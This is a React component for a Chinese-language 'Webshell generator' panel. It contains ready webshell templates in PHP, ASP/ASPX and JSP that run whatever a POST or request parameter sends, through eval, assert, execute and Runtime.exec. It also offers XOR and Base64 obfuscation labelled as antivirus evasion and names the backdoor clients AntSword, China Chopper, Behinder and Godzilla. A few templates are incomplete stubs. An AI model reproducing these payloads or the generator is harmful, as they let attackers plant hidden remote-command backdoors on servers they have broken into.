import { useState, useMemo } from 'react';
import {
    Stack, Select, TextInput, Textarea, Paper, Group,
    Switch, Title, Text, Badge, ActionIcon, Tooltip,
    Tabs, Alert
} from '@mantine/core';
import {
    IconCopy, IconCheck, IconShieldLock, IconMap,
    IconCode
} from '@tabler/icons-react';
import { useClipboard } from '@mantine/hooks';
import { showNotification } from '../../utils/notifications';
import { handleAppError } from "../../utils/error.ts";

// Payload 模板库
const WEBSHELL_TEMPLATES = {
    PHP: [
        { value: 'php_eval', label: '基础 Eval', template: '<?php {at}eval($_POST["{pass}"]); ?>' },
        { value: 'php_assert', label: 'Assert (绕过常用)', template: '<?php {at}assert($_POST["{pass}"]); ?>' },
        { value: 'php_xor', label: '异或混淆 (免杀)', template: '<?php $k="\\x08\\x02\\x08";$kh="\\xf3\\xed";$kf="\\xf6\\xe1";$p="";foreach([1,2] as $n){$p.=$k;} {at}eval(@$_POST["{pass}"]^$p); ?>' },
        { value: 'php_create_func', label: 'create_function', template: '<?php $f=create_function("", $_POST["{pass}"]);$f(); ?>' },
    ],
    ASP_ASPX: [
        { value: 'asp_eval', label: 'ASP Eval', template: '<%execute(request("{pass}"))%>' },
        { value: 'aspx_eval', label: 'ASPX Jscript', template: '<%@ Page Language="Jscript"%><%{at}eval(Request.Item["{pass}"],"unsafe");%>' },
        { value: 'aspx_handler', label: 'ASPX Handler (冰蝎适配)', template: '<%@ WebHandler Language="C#" Class="Handler" %>\nusing System;\nusing System.Web;\npublic class Handler : IHttpHandler { ... }' },
    ],
    JSP: [
        { value: 'jsp_runtime', label: 'JSP Runtime', template: '<% Runtime.getRuntime().exec(request.getParameter("{pass}")); %>' },
        { value: 'jsp_reflect', label: 'JSP 反射 (免杀)', template: '<% Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(...) %>' },
        { value: 'jsp_jsl', label: 'JSP Custom Tag', template: '<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>' },
    ]
};

export default function WebshellGenerator() {
    const [tab, setTab] = useState<string | null>('PHP');
    const [type, setType] = useState<string | null>('php_eval');
    const [password, setPassword] = useState('ant');
    const [useAtSign, setUseAtSign] = useState(true);
    const [isObfuscated, setIsObfuscated] = useState(false);
    const clipboard = useClipboard();

    // 自动重置类型，当切换语言 Tab 时
    const handleTabChange = (value: string | null) => {
        setTab(value);
        if (value === 'PHP') setType('php_eval');
        else if (value === 'ASP_ASPX') setType('asp_eval');
        else setType('jsp_runtime');
    };

    const payload = useMemo(() => {
        try {
            const allItems = Object.values(WEBSHELL_TEMPLATES).flat();
            const selected = allItems.find(i => i.value === type);
            if (!selected) return '';

            const at = useAtSign ? '@' : '';
            let code = selected.template
                .replace(/{at}/g, at)
                .replace(/{pass}/g, password);

            // 增强混淆：Base64 包装（针对 PHP）
            if (isObfuscated && tab === 'PHP') {
                const b64 = btoa(code.replace('<?php ', '').replace(' ?>', ''));
                code = `<?php ${at}eval(base64_decode("${b64}")); ?>`;
            }

            return code;
        } catch (err) {
            handleAppError(err, { title: 'Payload 生成失败' });
            return '';
        }
    }, [type, password, useAtSign, isObfuscated, tab]);

    return (
        <Paper p="md" withBorder shadow="xs" radius="md">
            <Group justify="space-between" mb="lg">
                <Group gap="xs">
                    <IconShieldLock size={26} color="var(--mantine-color-red-6)" />
                    <div>
                        <Title order={4}>Webshell 生成器</Title>
                        <Text size="xs" c="dimmed">支持多种编程语言、免杀混淆及工具适配的 Webshell 生成器</Text>
                    </div>
                </Group>
                <Badge variant="dot" color="green" radius="xl">
                    模板库: V2.0
                </Badge>
            </Group>

            <Tabs value={tab} onChange={handleTabChange} variant="outline">
                <Tabs.List>
                    <Tabs.Tab value="PHP" leftSection={<IconCode size={14} />}>PHP</Tabs.Tab>
                    <Tabs.Tab value="ASP_ASPX" leftSection={<IconCode size={14} />}>ASP/ASPX</Tabs.Tab>
                    <Tabs.Tab value="JSP" leftSection={<IconCode size={14} />}>JSP/Java</Tabs.Tab>
                </Tabs.List>

                <Stack gap="md" mt="md">
                    <Group grow>
                        <Select
                            label="攻击载荷类型"
                            data={WEBSHELL_TEMPLATES[tab as keyof typeof WEBSHELL_TEMPLATES] || []}
                            value={type}
                            onChange={setType}
                        />
                        <TextInput
                            label="连接密码"
                            placeholder="如: ant, pass, cmd"
                            value={password}
                            onChange={(e) => setPassword(e.currentTarget.value)}
                        />
                    </Group>

                    <Group gap="xl">
                        <Switch
                            label="错误抑制 (@)"
                            checked={useAtSign}
                            onChange={(e) => setUseAtSign(e.currentTarget.checked)}
                        />
                        <Switch
                            label="Base64 混淆层"
                            checked={isObfuscated}
                            disabled={tab !== 'PHP'}
                            onChange={(e) => setIsObfuscated(e.currentTarget.checked)}
                        />
                    </Group>

                    <Stack gap={5}>
                        <Group justify="space-between">
                            <Text size="sm" fw={500}>生成的代码 (Payload):</Text>
                            <Tooltip label={clipboard.copied ? "已复制" : "点击复制"}>
                                <ActionIcon
                                    variant="light"
                                    color={clipboard.copied ? 'green' : 'blue'}
                                    onClick={() => {
                                        clipboard.copy(payload);
                                        showNotification({ type: 'info', message: 'Payload 已复制到剪贴板' });
                                    }}
                                >
                                    {clipboard.copied ? <IconCheck size={18} /> : <IconCopy size={18} />}
                                </ActionIcon>
                            </Tooltip>
                        </Group>
                        <Textarea
                            value={payload}
                            readOnly
                            autosize
                            minRows={4}
                            styles={{ input: { fontFamily: 'monospace', fontSize: '12px', } }}
                        />
                    </Stack>
                </Stack>
            </Tabs>

            <Alert icon={<IconMap size={16} />} title="管理工具适配说明" color="gray" mt="xl" variant="light">
                <Text size="xs">
                    <b>基础型</b>：适配中国蚁剑 (AntSword)、菜刀 (Chopper)。<br />
                    <b>混淆型</b>：需配合自定义解码器或脚本引擎使用。<br />
                    <b>JSP/ASPX</b>：推荐使用冰蝎 (Behinder) 或 哥斯拉 (Godzilla) 生成特定服务端。
                </Text>
            </Alert>
        </Paper>
    );
}